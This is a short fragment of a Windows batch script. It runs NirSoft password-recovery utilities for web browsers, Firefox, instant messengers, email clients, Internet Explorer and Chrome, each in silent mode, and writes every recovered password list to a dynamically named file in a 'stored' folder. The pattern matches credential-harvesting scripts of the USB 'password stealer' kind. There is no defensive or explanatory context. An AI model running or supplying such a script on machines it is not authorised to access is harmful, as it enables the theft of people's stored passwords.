...
start WebBrowserPassView.exe /stext stored\WebBrowserPassView_%DYNPATHNAME%
...
start PasswordFox.exe /stext stored\PasswordFox_%DYNPATHNAME%
...
start mspass.exe /stext stored\mspass_%DYNPATHNAME%
...
start mailpv.exe /stext stored\mailpv_%DYNPATHNAME%
...
start iepv.exe /stext stored\iepv_%DYNPATHNAME%
...
start ChromePass.exe /stext stored\ChromePass_%DYNPATHNAME%
